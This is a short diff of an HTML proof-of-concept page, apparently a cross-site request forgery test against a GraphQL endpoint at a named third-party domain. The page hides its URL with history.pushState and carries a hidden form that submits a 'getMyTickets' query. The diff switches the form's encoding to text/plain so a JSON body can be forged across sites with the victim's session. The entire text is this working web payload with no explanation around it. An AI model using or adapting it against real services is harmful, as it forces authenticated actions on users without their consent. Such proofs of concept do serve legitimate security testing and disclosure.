@@ -3,7 +3,7 @@
   <body>
   <script>history.pushState('', '', '/')</script>
 
-    <form action="https://ap.app.helloanew.com/api/graphql" method="POST" enctype="application/json">
+    <form action="https://ap.app.helloanew.com/api/graphql" method="POST" enctype="text/plain">
       <input type="hidden" name="{"operationName":"getMyTickets","variables":{},"query":"query getMyTickets {\n  myTickets {\n    id\n    unique_id\n    status_id\n    status_updated_at\n    user_description\n    created_at\n    service_group_id\n    service_group_path\n    repair_price_created_at\n    repair_price_expires_at\n    __typename\n  }\n}\n"}" value="" />
       <input type="submit" value="Submit request" />
     </form>
